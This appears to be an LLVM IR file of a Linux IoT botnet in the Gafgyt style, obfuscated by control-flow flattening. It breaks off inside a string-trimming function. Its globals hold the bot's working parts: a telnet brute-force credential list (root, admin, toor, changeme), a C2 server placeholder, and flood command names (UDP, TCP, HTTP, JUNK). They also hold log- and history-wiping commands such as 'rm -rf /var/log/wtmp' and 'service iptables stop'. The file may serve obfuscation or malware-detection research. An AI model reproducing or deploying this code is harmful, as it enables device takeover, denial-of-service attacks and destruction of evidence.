; ModuleID = 'host/ir_fla/Void.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [14 x i8] c"PAYLOADZZZZ\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"IP:23\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.31 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.112 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.40 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.43 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.45 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"sername:\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.55 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.56 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.59 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.63 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.68 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.74 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.85 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.87 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.88 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.90 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.91 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.93 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.94 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.96 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"DONGS\00", align 1
@.str.99 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"sshd\00", align 1
@.str.102 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 685209274, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 685209274, label %10
    i32 361500197, label %14
    i32 370896239, label %32
    i32 745485398, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 361500197, i32 745485398
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 370896239, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 685209274, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1646095320, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1646095320, label %first
    i32 20189562, label %30
    i32 1159687778, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 20189562, i32 1159687778
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 1159687778, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 152086570, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 152086570, label %10
    i32 1467403912, label %20
    i32 901703422, label %23
    i32 -376986203, label %24
    i32 -849946088, label %29
    i32 1230066622, label %38
    i32 -226913793, label %40
    i32 -765387839, label %43
    i32 479509116, label %45
    i32 1655721011, label %50
    i32 -378807696, label %62
    i32 -909311531, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1467403912, i32 901703422
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 152086570, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -376986203, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -849946088, i32 1230066622
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 1230066622, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -226913793, i32 -765387839
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -376986203, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 479509116, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 1655721011, i32 -909311531
  store i32 %49, i32* %switchVar
  br label %loopEnd

